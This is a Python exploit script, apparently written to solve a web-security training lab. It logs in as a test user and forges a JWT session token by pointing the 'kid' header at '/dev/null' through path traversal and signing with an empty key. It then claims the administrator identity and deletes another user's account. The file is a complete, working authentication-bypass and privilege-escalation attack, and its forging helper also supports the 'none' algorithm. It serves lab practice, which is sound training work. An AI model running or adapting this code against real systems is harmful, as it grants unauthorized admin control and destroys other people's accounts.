import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import base64
import json
import hmac
import hashlib
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        'username': username,
        'password': password,
        'csrf': get_csrf_token(s, url, path)
    }
    r = s.post(login_url, data=payload, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def decode_jwt(token):
    header, payload, signature = token.split('.')    
    header_decoded  = json.loads(base64.urlsafe_b64decode(header  + '=='))
    payload_decoded = json.loads(base64.urlsafe_b64decode(payload + '=='))
    return header_decoded, payload_decoded, signature

def encode_jwt(header_json, payload_json, signature):
    new_header  = base64.urlsafe_b64encode(json.dumps(header_json,  separators=(',', ':')).encode()).rstrip(b'=').decode()
    new_payload = base64.urlsafe_b64encode(json.dumps(payload_json, separators=(',', ':')).encode()).rstrip(b'=').decode()
    return f"{new_header}.{new_payload}.{signature}"

def sign_jwt(header_json, payload_json, key):
    new_header  = base64.urlsafe_b64encode(json.dumps(header_json,  separators=(',', ':')).encode()).rstrip(b'=').decode()
    new_payload = base64.urlsafe_b64encode(json.dumps(payload_json, separators=(',', ':')).encode()).rstrip(b'=').decode()
    signing_input = f"{new_header}.{new_payload}"

    alg = header_json.get('alg', 'HS256')
    if alg == 'none':
        return f"{signing_input}."
    elif alg.startswith('HS'):
        hash_map = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
        secret = key if isinstance(key, bytes) else key.encode()
        signature = hmac.new(secret, signing_input.encode(), hash_map[alg]).digest()
    elif alg.startswith('RS'):
        hash_map = {'RS256': hashes.SHA256(), 'RS384': hashes.SHA384(), 'RS512': hashes.SHA512()}
        signature = key.sign(signing_input.encode(), asym_padding.PKCS1v15(), hash_map[alg])
    else:
        raise ValueError(f"Unsupported algorithm: {alg}")
    signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
    return f"{signing_input}.{signature_b64}"

def jwt_kid_injection(s):
    key = ''
    token = s.cookies['session']
    header_json, payload_json, _ = decode_jwt(token)
    header_json['alg'] = 'HS256'
    header_json['kid'] = "../../../../../../../dev/null"
    payload_json['sub'] = 'administrator'
    new_token = sign_jwt(header_json, payload_json, key)
    s.cookies['session'] = new_token

def goto(s, url, path, headers={}, cookies={}):
    target_url = url + path
    r = s.get(target_url, headers=headers, cookies=cookies, allow_redirects=False)
    return r.text

def delete_user(s, url, path, username):
    target_url = url + path + f'?username={username}'
    r = s.get(target_url, allow_redirects=False)
    
    if r.status_code == 302:
        print(f'[+] Successful delete {username} account')
    else:
        print(f'[-] Failed to delete {username} account')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].rstrip('/') 

    username = 'wiener'
    password = 'peter'
    target_user = 'carlos'

    login_acc(s, url, '/login', username, password)
    jwt_kid_injection(s)
    delete_user(s, url, '/admin/delete', target_user)
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()